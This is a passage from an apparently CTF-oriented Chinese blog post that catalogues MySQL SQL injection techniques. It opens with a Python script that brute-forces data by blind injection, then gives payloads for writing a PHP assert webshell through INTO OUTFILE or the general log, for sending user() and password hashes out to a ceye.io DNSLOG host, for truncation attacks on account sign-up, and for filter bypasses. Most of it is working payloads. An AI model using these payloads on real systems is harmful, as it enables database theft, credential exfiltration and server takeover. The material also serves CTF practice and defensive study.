<p>因为6是像读取的第一个字符，所以为6的时候，flag就在后面，但是超过6之后，flag就在前面了，所以就可以依次注入下去就知道了</p>
<p>脚本：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br>key = <span class="hljs-string">&quot;&lt;tr&gt;&lt;td&gt; id: 3 &lt;/td&gt; &lt;td&gt; name: threezh1 &lt;/td&gt; &lt;br/&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt; id: 3 &lt;/td&gt; &lt;td&gt; name: 3 &lt;/td&gt; &lt;br/&gt;&lt;/tr&gt;&quot;</span><br>words = <span class="hljs-string">&quot;&quot;</span><br>data = <span class="hljs-string">&quot;id=3 union select 3,&#x27;&#123;0&#125;&#x27;,3 order by 2&quot;</span><br>dic = <span class="hljs-string">&quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span><br><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">100</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> dic:<br>        payload = data.<span class="hljs-built_in">format</span>(words + j)<br>        <span class="hljs-built_in">print</span>(payload)<br>        content = requests.get(<span class="hljs-string">&quot;http://127.0.0.1/index.php?&quot;</span> + payload)<br>        <span class="hljs-keyword">if</span> key <span class="hljs-keyword">in</span> content.text:<br>            words = words + temp<br>            <span class="hljs-built_in">print</span>(words)<br>            <span class="hljs-keyword">break</span><br>        temp = j<br></code></pre></td></tr></table></figure></li>
</ol>
<p><img src="https://s3.ax1x.com/2020/12/26/rhQUHS.png" alt="grs"></p>
<p>这里有个问题就是，当select 1,2,3 中字段位的数据与数据库里的数据相等时，，匹配的时候如果是匹配的是7就是7不用再退一位。</p>
<p>最后跑出来是<code>666c61677b643067335f74687265657a68317c</code></p>
<p>那么真实的<code>flag</code>的<code>base16</code>编码为：<code>666c61677b643067335f74687265657a68317d</code></p>
<h3 id="无列名注入："><a href="#无列名注入：" class="headerlink" title="无列名注入："></a>无列名注入：</h3><h4 id="构造别名"><a href="#构造别名" class="headerlink" title="构造别名"></a>构造别名</h4><p>正常的查询如下：</p>
<p><img src="/wzimg/1.png" alt="z"></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> hahaha;<br></code></pre></td></tr></table></figure>

<p><img src="/wzimg/2.png" alt="x"></p>
<p>我们可以自己构造名字进行查询</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> b <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span> <span class="hljs-keyword">as</span> b,<span class="hljs-number">3</span>,<span class="hljs-number">4</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> hahaha)a;<br></code></pre></td></tr></table></figure>

<p><img src="/wzimg/3.png" alt="c"></p>
<h4 id="join-…-using-xx"><a href="#join-…-using-xx" class="headerlink" title="join … using(xx)"></a>join … using(xx)</h4><p>当知道表名为<code>users</code>时，使用如下语句得到列名<br>第一列：</p>
<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csharp">?id=<span class="hljs-number">-1&#x27;</span> union all <span class="hljs-keyword">select</span>*<span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> users <span class="hljs-keyword">as</span> a <span class="hljs-keyword">join</span> users b)c<span class="hljs-meta">#</span><br></code></pre></td></tr></table></figure>

<p>第二列：</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">?id=-1&#x27; union all <span class="hljs-keyword">select</span>*<span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> users <span class="hljs-keyword">as</span> a <span class="hljs-keyword">join</span> users b <span class="hljs-keyword">using</span>(id))c–+<br></code></pre></td></tr></table></figure>

<p>第三列：</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">?id=-1&#x27; union all <span class="hljs-keyword">select</span>*<span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> users <span class="hljs-keyword">as</span> a <span class="hljs-keyword">join</span> users b <span class="hljs-keyword">using</span>(id,username))c–+<br></code></pre></td></tr></table></figure>



<h3 id="文件读写："><a href="#文件读写：" class="headerlink" title="文件读写："></a>文件读写：</h3><h4 id="file-priv和secure-file-priv"><a href="#file-priv和secure-file-priv" class="headerlink" title="file_priv和secure-file-priv"></a>file_priv和secure-file-priv</h4><p><code>file_priv</code>是对于用户的文件读写权限，若无权限则不能进行文件读写操作，可通过下述payload查询权限。</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> file_priv <span class="hljs-keyword">from</span> mysql.user <span class="hljs-keyword">where</span> <span class="hljs-keyword">user</span><span class="hljs-operator">=</span>$<span class="hljs-keyword">USER</span> host<span class="hljs-operator">=</span>$HOST;<br></code></pre></td></tr></table></figure>

<p><img src="/wzimg/4.png" alt="v"></p>
<p><code>secure-file-priv</code>是一个系统变量，对于文件读/写功能进行限制。具体如下：</p>
<p>无内容，表示无限制。</p>
<p>为NULL，表示禁止文件读/写。</p>
<p>为目录名，表示仅允许对特定目录的文件进行读/写。</p>
<p>5.5.53本身及之后的版本默认值为NULL，之前的版本无内容。<br>三种方法查看当前<code>secure-file-priv</code>的值：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> @<span class="hljs-variable">@secure</span>_file_priv;<br><span class="hljs-keyword">select</span> @<span class="hljs-variable">@global</span>.secure_file_priv;<br><span class="hljs-keyword">show</span> variables <span class="hljs-keyword">like</span> &quot;secure_file_priv&quot;;<br></code></pre></td></tr></table></figure>

<p><img src="/wzimg/5.png" alt="b"></p>
<h4 id="读文件"><a href="#读文件" class="headerlink" title="读文件"></a>读文件</h4><p><code>Mysql</code>读取文件通常使用<code>load_file</code>函数，语法如下：<br><code>select load_file(file_path);</code><br>第二种：<br><code>load data infile “/etc/passwd” into table test FIELDS TERMINATED BY ‘\n’;</code> #读取服务端文件<br>第三种：<br><code>load data local infile “/etc/passwd” into table test FIELDS TERMINATED BY ‘\n’; </code>#读取客户端文件</p>
<p>限制：</p>
<ul>
<li>前两种需要secure-file-priv无值或为有利目录。</li>
<li>都需要知道要读取的文件所在的绝对路径。</li>
<li>要读取的文件大小必须小于max_allowed_packet所设置的值</li>
</ul>
<h4 id="写文件"><a href="#写文件" class="headerlink" title="写文件"></a>写文件</h4><p>常见的写文件操作如下：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,&quot;&lt;?php @assert($_POST[&#x27;w0s1np&#x27;]);?&gt;&quot; <span class="hljs-keyword">into</span> outfile <span class="hljs-string">&#x27;/var/www/html/1.php&#x27;</span>;<br><span class="hljs-keyword">select</span> <span class="hljs-number">2</span>,&quot;&lt;?php @assert($_POST[&#x27;w0s1np&#x27;]);?&gt;&quot; <span class="hljs-keyword">into</span> dumpfile <span class="hljs-string">&#x27;/var/www/html/1.php&#x27;</span>;<br></code></pre></td></tr></table></figure>

<p>限制：</p>
<ul>
<li><code>secure-file-priv</code>无值或为可利用的目录</li>
<li>需知道目标目录的绝对目录地址</li>
<li>目标目录可写，<code>mysql</code>的权限足够</li>
</ul>
<h5 id="日志法"><a href="#日志法" class="headerlink" title="日志法"></a>日志法</h5><p>由于mysql在5.5.53版本之后，<code>secure-file-priv</code>的值默认为NULL，这使得正常读取文件的操作基本不可行。我们这里可以利用<code>mysql</code>生成日志文件的方法来绕过。<br><code>mysql</code>日志文件的一些相关设置可以直接通过命令来进行：</p>
<figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs lasso"><span class="hljs-comment">//请求日志</span><br>mysql&gt; <span class="hljs-built_in">set</span> <span class="hljs-built_in">global</span> general_log_file = <span class="hljs-string">&#x27;/var/www/html/1.php&#x27;</span>;<br>mysql&gt; <span class="hljs-built_in">set</span> <span class="hljs-built_in">global</span> general_log = <span class="hljs-keyword">on</span>;<br><span class="hljs-comment">//慢查询日志</span><br>mysql&gt; <span class="hljs-built_in">set</span> <span class="hljs-built_in">global</span> slow_query_log_file=<span class="hljs-string">&#x27;/var/www/html/2.php&#x27;</span><br>mysql&gt; <span class="hljs-built_in">set</span> <span class="hljs-built_in">global</span> slow_query_log=<span class="hljs-number">1</span>;<br><span class="hljs-comment">//还有其他很多日志都可以进行利用</span><br><span class="hljs-params">...</span><br></code></pre></td></tr></table></figure>

<p>之后我们在让数据库执行满足记录条件的恶意语句即可。</p>
<p>限制：</p>
<ul>
<li>权限够，可以进行日志的设置操作</li>
<li>知道目标目录的绝对路径</li>
</ul>
<h4 id="DNSLOG外带数据-目标系统为Windows才可用"><a href="#DNSLOG外带数据-目标系统为Windows才可用" class="headerlink" title="DNSLOG外带数据(目标系统为Windows才可用)"></a>DNSLOG外带数据(目标系统为Windows才可用)</h4><p>payload:</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">load_file(concat(<span class="hljs-string">&#x27;\\\\&#x27;</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>()),<span class="hljs-string">&#x27;.xxxx.ceye.io\xxxx&#x27;</span>))<br><br>http://<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>/mysql.php?id=<span class="hljs-number">1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,load_file(CONCAT(<span class="hljs-string">&#x27;\\&#x27;</span>,(<span class="hljs-keyword">SELECT</span> hex(pass) <br><span class="hljs-keyword">FROM</span> test.test_user <span class="hljs-keyword">WHERE</span> <span class="hljs-type">name</span>=<span class="hljs-string">&#x27;admin&#x27;</span> <span class="hljs-keyword">LIMIT</span> <span class="hljs-number">1</span>),<span class="hljs-string">&#x27;.mysql.nk40ci.ceye.io\abc&#x27;</span>))<br></code></pre></td></tr></table></figure>

<p>应用场景：</p>
<ul>
<li>三大注入无法使用</li>
<li>有文件读取权限及secure-file-priv无值。</li>
<li>不知道网站/目标文件/目标目录的绝对路径</li>
<li>目标系统为Windows</li>
</ul>
<p>在<code>Windows</code>中，路径以\开头的路径在<code>Windows</code>中被定义为<code>UNC</code>路径，相当于网络硬盘一样的存在，所以我们填写域名的话，<code>Windows</code>会先进行<code>DNS</code>查询。但是对于<code>Linux</code>来说，并没有这一标准，所以<code>DNSLOG</code>在<code>Linux</code>环境不适用。注：<code>payload</code>里的四个\中的两个\是用来进行转义处理的。</p>
<h3 id="约束攻击"><a href="#约束攻击" class="headerlink" title="约束攻击"></a>约束攻击</h3><p>在<code>SQL</code>中执行字符串处理时，字符串末尾的空格符将会被删除。换句话说<code>“w0s1np”</code>等同于<code>“w0s1np ”</code></p>
<p>先举个例子：<br>建立一个用户表：做了25个字符的限制</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php">CREATE TABLE users(<br>    username varchar(<span class="hljs-number">25</span>),<br>    password varchar(<span class="hljs-number">25</span>)<br>)<br></code></pre></td></tr></table></figure>

<p>注册代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$conn</span> = mysqli_connect(<span class="hljs-string">&quot;127.0.0.1:3307&quot;</span>, <span class="hljs-string">&quot;root&quot;</span>, <span class="hljs-string">&quot;root&quot;</span>, <span class="hljs-string">&quot;db&quot;</span>);<br><span class="hljs-keyword">if</span> (!<span class="hljs-variable">$conn</span>) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Connection failed: &quot;</span> . mysqli_connect_error());<br>&#125;<br><span class="hljs-variable">$username</span> = addslashes(@<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>]);<br><span class="hljs-variable">$password</span> = addslashes(@<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>]);<br><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;select * from users where username = &#x27;<span class="hljs-subst">$username</span>&#x27;&quot;</span>;<br><span class="hljs-variable">$rs</span> = mysqli_query(<span class="hljs-variable">$conn</span>,<span class="hljs-variable">$sql</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$rs</span>-&gt;fetch_row())&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;账号已注册&#x27;</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-variable">$sql2</span> = <span class="hljs-string">&quot;insert into users values(&#x27;<span class="hljs-subst">$username</span>&#x27;,&#x27;<span class="hljs-subst">$password</span>&#x27;)&quot;</span>;<br>    mysqli_query(<span class="hljs-variable">$conn</span>,<span class="hljs-variable">$sql2</span>);<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;注册成功&#x27;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>登录判断代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$conn</span> = mysqli_connect(<span class="hljs-string">&quot;127.0.0.1:3307&quot;</span>, <span class="hljs-string">&quot;root&quot;</span>, <span class="hljs-string">&quot;root&quot;</span>, <span class="hljs-string">&quot;db&quot;</span>);<br><span class="hljs-keyword">if</span> (!<span class="hljs-variable">$conn</span>) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Connection failed: &quot;</span> . mysqli_connect_error());<br>&#125;<br><span class="hljs-variable">$username</span> = addslashes(@<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>]);<br><span class="hljs-variable">$password</span> = addslashes(@<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>]);<br><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;select * from users where username = &#x27;<span class="hljs-subst">$username</span>&#x27; and password=&#x27;<span class="hljs-subst">$password</span>&#x27;;&quot;</span>;<br><span class="hljs-variable">$rs</span> = mysqli_query(<span class="hljs-variable">$conn</span>,<span class="hljs-variable">$sql</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$rs</span>-&gt;fetch_row())&#123;<br>    <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;username&#x27;</span>]=<span class="hljs-variable">$password</span>;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;fail&quot;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>上面的代码无编码问题，且对用户输入做了单引号处理，但是前边创建表格的语句限制了<code>username</code>和<code>password</code>的长度最大为20，若我们插入数据超过25，MYSQL则会截取前边的25个字符进行插入。</p>
<p>而对于SELECT查询请求，若查询的数据超过25长度，也不会进行截取操作，这就产生了一个问题。</p>
<p>通常对于注册处的代码来说，需要先判断注册的用户名是否存在，再进行插入数据操作。如我们注册一个<code>username=admin[25个空格]&amp;password=123456</code>的账号，服务器会先查询<code>admin[25个空格]x</code>的用户是否存在，若存在，则不能注册。若不存在，则进行插入数据的操作。而此处我们限制了<code>username</code>与<code>password</code>字段长度最大为25，所以我们实际插入的数据为<code>username=admin[20个空格]&amp;password=123456。</code></p>
<p>接着进行登录的时，我们使用：<code>username=admin&amp;password=123456</code>进行登录，即可成功登录<code>admin</code>的账号。</p>
<h3 id="Insert-amp-Update-amp-Delete注入"><a href="#Insert-amp-Update-amp-Delete注入" class="headerlink" title="Insert&amp;Update&amp;Delete注入"></a>Insert&amp;Update&amp;Delete注入</h3><p><code>insert、update、Delete</code>一般使用报错注入，白盒也可以采用闭合的方式注入</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs sql">mysql<span class="hljs-operator">&gt;</span> <span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> users <span class="hljs-keyword">values</span>(<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;test&#x27;</span> <span class="hljs-keyword">and</span> extractvalue(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,<span class="hljs-keyword">user</span>(),<span class="hljs-number">0x7e</span>)));<br>ERROR <span class="hljs-number">1105</span> (HY000): XPATH syntax error: <span class="hljs-string">&#x27;~root@localhost~&#x27;</span><br>mysql<span class="hljs-operator">&gt;</span> update users <span class="hljs-keyword">set</span> username<span class="hljs-operator">=</span><span class="hljs-string">&#x27;test&#x27;</span> <span class="hljs-keyword">where</span> id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> extractvalue(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,<span class="hljs-keyword">user</span>(),<span class="hljs-number">0x7e</span>));<br>ERROR <span class="hljs-number">1105</span> (HY000): XPATH syntax error: <span class="hljs-string">&#x27;~root@localhost~&#x27;</span><br>mysql<span class="hljs-operator">&gt;</span> <span class="hljs-keyword">delete</span> <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> extractvalue(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,<span class="hljs-keyword">user</span>(),<span class="hljs-number">0x7e</span>));<br>ERROR <span class="hljs-number">1105</span> (HY000): XPATH syntax error: <span class="hljs-string">&#x27;~root@localhost~&#x27;</span><br></code></pre></td></tr></table></figure>

<p>如果没有错误回显就可以使用延时注入</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs sql">mysql<span class="hljs-operator">&gt;</span> <span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> users <span class="hljs-keyword">values</span>(<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;test&#x27;</span>,<span class="hljs-string">&#x27;test&#x27;</span> <span class="hljs-keyword">or</span> (if((length(database())<span class="hljs-operator">=</span><span class="hljs-number">8</span>),sleep(<span class="hljs-number">5</span>),<span class="hljs-number">1</span>)));<br>ERROR <span class="hljs-number">1062</span> (<span class="hljs-number">23000</span>): Duplicate entry <span class="hljs-string">&#x27;1&#x27;</span> <span class="hljs-keyword">for</span> key <span class="hljs-string">&#x27;PRIMARY&#x27;</span><br>mysql<span class="hljs-operator">&gt;</span> update users <span class="hljs-keyword">set</span> username<span class="hljs-operator">=</span><span class="hljs-string">&#x27;test&#x27;</span> <span class="hljs-keyword">where</span> id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> if((length(database())<span class="hljs-operator">=</span><span class="hljs-number">8</span>),sleep(<span class="hljs-number">5</span>),<span class="hljs-number">1</span>);<br>Query OK, <span class="hljs-number">0</span> <span class="hljs-keyword">rows</span> affected (<span class="hljs-number">5.00</span> sec)<br><span class="hljs-keyword">Rows</span> matched: <span class="hljs-number">0</span>  Changed: <span class="hljs-number">0</span>  Warnings: <span class="hljs-number">0</span><br>mysql<span class="hljs-operator">&gt;</span> <span class="hljs-keyword">delete</span> <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> if((length(database())<span class="hljs-operator">=</span><span class="hljs-number">8</span>),sleep(<span class="hljs-number">5</span>),<span class="hljs-number">1</span>);<br>Query OK, <span class="hljs-number">0</span> <span class="hljs-keyword">rows</span> affected (<span class="hljs-number">5.00</span> sec)<br></code></pre></td></tr></table></figure>



<h3 id="Mysql下Limit注入方法"><a href="#Mysql下Limit注入方法" class="headerlink" title="[Mysql下Limit注入方法]"></a>[Mysql下Limit注入方法]</h3><p><strong>此方法适用于MySQL 5.x中，在limit语句后面的注入</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SELECT field FROM table WHERE id &gt; 0 ORDER BY id LIM<br></code></pre></td></tr></table></figure>

<p><strong>在LIMIT后面可以跟两个函数，PROCEDURE 和 INTO，INTO除非有写入shell的权限，否则是无法利用的。<br>报错注入</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mysql">mysql&gt; select * from users where id&gt;1 order by id limit 1,1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1); <br>ERROR 1105 (HY000): XPATH syntax error: &#39;:5.5.53&#39;<br></code></pre></td></tr></table></figure>

<p><strong>时间注入</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mysql">select * from users where id&gt;1 order by id limit 1,1 procedure analyse((select extractvalue<br>(rand(),concat(0x3a,(IF(MID(version(),1,1) like 5,BENCHMARK(5000000,SHA1(1)),1))))),1);<br></code></pre></td></tr></table></figure>





<h3 id="注入时还可能有的一些方式"><a href="#注入时还可能有的一些方式" class="headerlink" title="注入时还可能有的一些方式"></a>注入时还可能有的一些方式</h3><p>二次注入：就是在有注册和登录的地方进行注入，其实CTF都有套路的，看到SQL注入题型存在修改密码的一般都是二次注入</p>
<p>遇到转义的时候，如果是GBK编码，我们可以使用宽字节注入，就是在转义的前面加一个<code>%df</code>就好，原因就是<code>%df</code>和反斜杠的<code>%5c</code>连起来是中国汉字‘连’。</p>
<p>有些题还可能存在<code>cookie</code>注入，这个也只是一种方式，其实也是使用<code>union</code>注入就好了，只不过是在<code>cookie</code>罢了</p>
<p>还可能存在<code>xff</code>，因为<code>xff</code>就是浏览器认为我们的<code>ip</code>地址，而且我们可以自己造假，所以我们就可以在<code>xff</code>里面也来注入</p>
<p>然后常见的过滤手法就是大小写，编码，内联注释，双写。</p>
<p>常见双写：aandnd  ununionion seselectlect  自己体会如何双写的。</p>
<p>然后常见可能被过滤的字符：</p>
<p>union and or select order 空格这些直接绕过就好了，主要就是自己判断什么被过滤了</p>
<p><code>load_file</code>读取文件内容</p>
<p>load_file()</p>
<p>1、必须有权限读取并且文件必须完全可读<br>　<br>2、欲读取文件必须在服务器上</p>
<p>3、必须指定文件完整的路径</p>
<p>4、欲读取文件必须小于 max_allowed_packet</p>
<p>如果存在以上条件，还可以注入，那么就可以用load_file()读文件<br>例如:<br><code>http://127.0.0.1/index.php?age=-1 union select 1,2,3,4,load_file(&#39;H:/wamp64/www/233.php&#39;)</code></p>
<h3 id="一些绕过手法总结"><a href="#一些绕过手法总结" class="headerlink" title="一些绕过手法总结"></a>一些绕过手法总结</h3><p>空格绕过：</p>
<p>多层括号嵌套，改用+号，使用注释/**/<br>and/or后面可以跟上偶数个!、~可以替代空格，也可以混合使用(规律又不同)，and/or前的空格可用省略<br><code>%09, %0a, %0b, %0c, %0d, %a0</code>等部分不可见字符可也代替空格（因为Windows的解析机制无法使用特殊字符代替空格，需要Linux的服务器环境才行）</p>
<p>and or绕过：</p>
<p>直接&amp;&amp; ||替换即可</p>
<p>引号绕过：</p>
<p>使用16进制绕过，例如：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> column_name  <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_name<span class="hljs-operator">=</span>&quot;users&quot;<br></code></pre></td></tr></table></figure>

<p>换为：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> column_name  <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_name<span class="hljs-operator">=</span><span class="hljs-number">0x7573657273</span><br></code></pre></td></tr></table></figure>

<p>因为<code>　users</code>的十六进制的字符串是<code>7573657273</code>。</p>
<p>也可通过进制转换函数表示成其他进制或者使用其他编码，如char()</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">FROM</span> Users <span class="hljs-keyword">WHERE</span> username <span class="hljs-operator">=</span> <span class="hljs-type">CHAR</span>(<span class="hljs-number">97</span>, <span class="hljs-number">100</span>, <span class="hljs-number">109</span>, <span class="hljs-number">105</span>, <span class="hljs-number">110</span>)<br></code></pre></td></tr></table></figure>

<p>还可以使用<code>%2527</code><br>为<code>%25</code>解码为<code>%</code>,结合后面的27也就是<code>%27</code>也就是<code>’</code>，所以成功绕过过滤</p>
<p>information_schema被过滤/拦截</p>
<p>利用<code>innodb</code>存储引擎(需要Mysql版本在5.5.x后并且<code>Mysql</code>开启了<code>innoDB</code>引擎)，例子如下：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> table_name <span class="hljs-keyword">from</span> mysql.innodb_table_stats <span class="hljs-keyword">where</span> database_name<span class="hljs-operator">=</span>database();<br><span class="hljs-keyword">select</span> table_name <span class="hljs-keyword">from</span> mysql.innodb_index_stats <span class="hljs-keyword">where</span> database_name<span class="hljs-operator">=</span>database();<br></code></pre></td></tr></table></figure>

<p>接下来的四个只能用于查表名，无法查询列名，所以进一步获取数据还需无列名注入</p>
<figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">sys.schem<span class="hljs-built_in">a_auto</span>_increment_columns<br>sys.x$schem<span class="hljs-built_in">a_table</span>_statistics_with_buffer<br>sys.schem<span class="hljs-built_in">a_table</span>_statistics_with_buffer<br>sys.x$ps_schem<span class="hljs-built_in">a_table</span>_statistics_io<br></code></pre></td></tr></table></figure>



<p>逗号被过滤：</p>
<ol>
<li><p>union select 逗号被过滤：</p>
<p>利用join注入，payload如下：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> ctf_test <span class="hljs-keyword">where</span> <span class="hljs-keyword">user</span><span class="hljs-operator">=</span><span class="hljs-string">&#x27;2&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> <span class="hljs-number">1</span>)a <span class="hljs-keyword">join</span> (<span class="hljs-keyword">select</span> <span class="hljs-number">2</span>)b;<br></code></pre></td></tr></table></figure>

